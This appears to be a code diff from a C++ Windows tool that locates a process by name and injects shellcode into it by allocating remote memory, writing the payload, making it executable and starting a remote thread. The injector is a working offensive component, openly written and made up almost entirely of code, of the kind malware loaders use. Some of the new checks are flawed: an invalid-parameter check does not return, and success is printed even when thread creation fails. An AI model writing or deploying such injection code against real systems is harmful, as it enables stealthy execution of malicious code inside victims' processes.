@@ -4,9 +4,10 @@
 #include <tchar.h>
 
 BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
-	//according to the documentation:
-	//before calling the Process32First function, set this member to sizeof(PROCESSENTRY32)
-	// if dwsize is not initialized,  process32first fail
+	if (!szProcessName || !dwProcessId || !hProcess) {
+		std::wcerr << L"[!] Invalid parameter passed to GetRemoteProcessHandle" << std::endl;
+		return FALSE;
+	}
 	PROCESSENTRY32 procEntry = { 0 };
 	procEntry.dwSize = sizeof(PROCESSENTRY32);
 
@@ -34,8 +35,9 @@ BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hP
 					FALSE,
 					procEntry.th32ProcessID
 				);
-				if (*hProcess == NULL) {
+				if (!*hProcess) {
 					std::wcerr << L"[!] Openprocess failed with error : " << GetLastError() << std::endl;
+					CloseHandle(hSnapshot);
 					return FALSE;
 				}
 				found = TRUE;
@@ -43,17 +45,20 @@ BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hP
 			}
 		} while (Process32Next(hSnapshot, &procEntry));
 	}
+	else {
+		std::wcerr << L"[!] Process32First failed with error : " << GetLastError() << std::endl;
+	}
 	CloseHandle(hSnapshot);
 	return found;
 }
 
 BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
-	PVOID pShellcodeAddress = NULL;
-	SIZE_T sNumberOfBytesWritten = 0;
-	DWORD dwOldProtection = NULL;
+	if (!hProcess || !pShellcode || !sSizeOfShellcode) {
+		std::wcerr << L"[!] Invalid Parameter to InjectShellcodeToRemoteProcess" << std::endl;
+	}
 
 	//allocate memory in the remote process of size sSizeOfShellcode
-	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	if (!pShellcodeAddress) {
 		std::wcerr << L"[!] VirtualAllocEx Failed with process : " << GetLastError() << std::endl;
@@ -61,10 +66,30 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	}
 	std::wcout << L"ALlocated Memory at : 0x" << pShellcodeAddress << std::endl;
 
+
+	SIZE_T sBytesWritten = 0;
 	//write the shellcode in the allocated memory
-	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sBytesWritten) || sBytesWritten != sSizeOfShellcode) {
 		std::wcerr << L"[!] WriteProcessMemory Failed with error : " << GetLastError() << std::endl;
 		return FALSE;
 	}
-	std::wcout << L""
+	std::wcout << L"[i] Successfully Written " << sBytesWritten << L" Bytes" << std::endl;
+
+	memset(pShellcode, '\0', sSizeOfShellcode);
+
+	DWORD dwOldProtection = 0;
+	//make the memory region executable
+	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
+		std::wcerr << L"[!] VirtualProtectEx Failed with error : " << GetLastError() << std::endl;
+		return FALSE;
+	}
+
+	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
+	if (!hRemoteThread) {
+		std::wcerr << L"[!] CreateRemoteThread Failed with error : " << GetLastError() << std::endl;
+	}
+	std::wcout << L"[+] Shellcode thread successfully created" << std::endl;
+	WaitForSingleObject(hRemoteThread, INFINITE);
+	CloseHandle(hRemoteThread);
+	return TRUE;
 }
